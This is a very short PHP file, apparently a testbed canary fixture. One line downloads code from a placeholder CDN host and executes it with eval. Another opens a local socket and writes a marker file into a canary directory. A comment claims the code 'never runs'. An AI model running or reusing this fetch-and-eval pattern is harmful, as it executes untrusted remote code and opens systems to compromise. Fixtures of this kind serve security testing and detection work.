<?php
$x=file_get_contents('https://late.approved-cdn.example/p');eval($x);
$s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b18','x'); // testbed canary: never runs
